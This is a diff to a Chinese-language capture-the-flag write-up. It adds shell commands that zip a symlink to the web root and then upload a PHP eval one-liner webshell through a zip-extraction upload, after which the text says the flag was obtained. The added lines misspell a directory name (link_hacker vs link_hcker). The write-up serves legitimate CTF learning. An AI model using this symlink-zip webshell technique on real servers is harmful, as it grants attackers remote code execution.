@@ -923,6 +923,7 @@ use function request;
 
 
 
+
 ---
 
 
@@ -1240,7 +1241,18 @@ if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
 
 然后再创建一个压缩包，用来传输一句话木马 **`'<?php @eval($_POST["cmd"]); phpinfo(); ?>'`** 给这个根目录。
 
-然后链接木马，进行搜索。
+```
+ln -s /var/www/html link_HACK
+zip --symlinks 1.zip link_HACK
+```
+
+```
+mkdir link_hacker
+echo '<?php @eval($_POST["cmd"]); phpinfo(); ?>' > link_hcker/shell.php
+zip -r step2.zip link_hacker
+```
+
+然后连接木马，进行搜索。
 
 很快就拿到了flag。
 
